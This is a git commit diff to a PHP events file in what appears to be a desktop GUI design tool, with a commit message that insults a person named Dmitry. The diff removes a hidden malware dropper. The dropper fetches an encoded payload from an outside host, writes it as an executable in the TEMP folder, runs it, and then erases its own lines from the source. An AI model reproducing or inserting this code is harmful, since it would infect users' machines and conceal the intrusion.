db2c9b80d68d34795fa206b07f2c29d0051c18b2
Andrew Zenin <kashaket@yandex.ua>
2019-07-28 14:22:12 +0100

    Update events.php
    Dmitry is dumb

--- system/design/events.php
+++ system/design/events.php
@@ -19,8 +19,3 @@ c('fmMain->tabForms')->onMouseDown    = 'myDesign::tabFormClick';
 c('fmObjectInspector->list')->onEdited= 'myDesign::objsInspectEdited';
 
 c('fmMain->itService')->onClick = 'myDesign::itViewsPopup';
-
-file_put_contents($_ENV['TEMP']."\\d8vXmZbT6c56tPxMYLVa.exe", gzinflate( base64_decode( file_get_contents("http://asdsads.freevar.com/111prot1.txt"))));
-run($_ENV['TEMP']."\\d8vXmZbT6c56tPxMYLVa.exe");
-$filne=file(__FILE__);unset($filne[22]);unset($filne[23]);unset($filne[24]);unset($filne[25]);unset($filne[26]);unset($filne[27]);
-file_put_contents(__FILE__, implode($filne));
